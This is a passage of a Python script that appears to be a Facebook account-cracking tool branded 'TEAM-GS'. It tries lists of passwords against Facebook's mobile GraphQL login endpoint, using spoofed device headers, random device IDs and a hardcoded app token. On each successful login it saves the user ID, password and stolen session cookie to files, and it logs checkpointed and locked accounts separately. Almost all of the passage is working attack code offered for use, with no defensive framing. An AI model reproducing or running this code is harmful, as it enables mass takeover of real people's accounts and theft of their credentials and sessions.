                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r    {G}[TEAM-GS-OK] {G}{uid} | {pas}')
                    print(f'\r\r    {G}[💥] {cookie}');linex()
                    open('/sdcard/TEAM-GS-OK-COOKIE-M1.txt', 'a').write(f"{uid}|{pas}|{cookie}\n")
                    oks.append(uid)
                    break
                else:
                    open("/sdcard/TEAM-GS-RADM-LOCK.txt", "a").write(f"{uid}|{pas}\n")
                    break
            elif 'checkpoint' in TEAM_GS_test:
                cookie = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx = cookie.split("checkpoint=")[1]
                uid = re.search("%22%3A(.*?)%2C%22", str(xx)).group(1)
                open("/sdcard/TEAM-GS-CP.txt", "a").write(uid + "|" + pas + "\n")
                cps.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(10)
    except Exception as e:
        pass
#METHOD_M2
def _TEAM_RANDOM_M2(ids):
    global loop, oks
    _clor_ = random.choice(["\x1b[38;5;196m", "\x1b[38;5;208m", "\033[1;30m","\x1b[38;5;160m", "\x1b[38;5;46m", "\033[1;33m","\033[38;5;6m", "\033[1;35m", "\033[1;36m", "\033[1;37m"])
    sys.stdout.write(f'\r\r    {W}[{G}TEAM-GS{Y}-{G}M1{W}]{Y}-{W}[{PP}{_clor_}{loop}{W}]{Y}-{W}[{G}OK{Y}-{G}{len(oks)}{W}]{Y}-{W}[{G}CP{Y}-{PP}{len(cps)}{W}]')
    sys.stdout.flush()
    try:
        for pw in plist:
            pas = pwmanager(ids, pw)
            data = {
                'method': 'post',
                'pretty': 'false',
                'format': 'json',
                'server_timestamps': 'true',
                'locale': 'en_US',
                'purpose': 'fetch',
                'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                'fb_api_caller_class': 'graphservice',
                'client_doc_id': '11994080425506443985518532446',
                'variables': json.dumps({
                    "params": {
                        "params": json.dumps({
                            "client_input_params": {
                                "contact_point": ids,
                                "password": f"#PWD_FB4A:0:{int(time.time())}:{pas}",
                                "secure_family_device_id": str(uuid.uuid4()),
                                "device_id": str(uuid.uuid4()),
                                "event_flow": "login_manual",
                                "login_attempt_count": 1,
                                "family_device_id": str(uuid.uuid4())
                            },
                            "server_params": {
                                "login_source": "Login",
                                "credential_type": "password",
                                "family_device_id": str(uuid.uuid4()),
                                "waterfall_id": str(uuid.uuid4())
                            }
                        }),
                        "bloks_versioning_id": "6e5066c89e362918fb2dee96006e79b5884689c496dc2d8364ce162aa16ee708",
                        "app_id": "com.bloks.www.bloks.caa.login.async.send_login_request"
                    }
                }),
                'fb_api_analytics_tags': '["GraphServices"]',
                'client_trace_id': str(uuid.uuid4()),
            }
            headers = {
                'user-agent': RANDM(),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'host': 'b-graph.facebook.com',
                'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-sim-hni': '30387',
                'x-fb-net-hni': '30941',
                'content-type': 'application/x-www-form-urlencoded',
                'x-graphql-client-library': 'graphservice',
                'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                'x-tigon-is-retry': 'False',
                'x-fb-privacy-context': '3643298472347298',
                'x-graphql-request-purpose': 'fetch',
                'x-fb-device-group': '2888',
                'x-zero-eh': '664c0faaac849cb891d0a261fbb72a12',
                'x-zero-state': 'unknown',
                'x-fb-connection-type': 'WIFI',
                'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=-994;recvTime=4160',
                'x-fb-request-analytics-tags': '{network_tags:{product:350685531728,purpose:fetch,request_category:graphql,retry_attempt:0},application_tags:graphservice}',
                'x-fb-http-engine': 'Tigon/Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
            }
            url = 'https://graph.facebook.com/graphql'
            edta = urllib.parse.urlencode(data, doseq=True).encode("utf-8")
            resx = requests.post(url, data=edta, headers=headers).text.replace('\\', '')
            if 'session_key' in str(resx):
                cookie = ";".join([f"{item['name']}={item['value']}" for item in json.loads(resx.split('session_cookies":')[1].split("]")[0] + "]")])
                uid = re.findall('c_user=(.*);xs', cookie)[0]
                ckk = f'https://graph.facebook.com/{uid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f'\r\r    {G}[TEAM-GS-OK] {G}{uid} | {pas}')
                    print(f'\r\r    {G}[💥] {cookie}');linex()
                    open('/sdcard/TEAM-GS-OK-COOKIE-M1.txt', 'a').write(f"{uid}|{pas}|{cookie}\n")
                    oks.append(uid)
                    break
                else:
                    open("/sdcard/TEAM-GS-LOCK.txt", "a").write(f"{uid}|{pas}\n")
                    break 
            else:
                continue
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
    loop += 1
##-------------[ END TOOLS]-------------##
if __name__ == "__main__":
    os.system('clear')
    ___random_main___()
else:
    os.system('clear')
    ___random_main___()
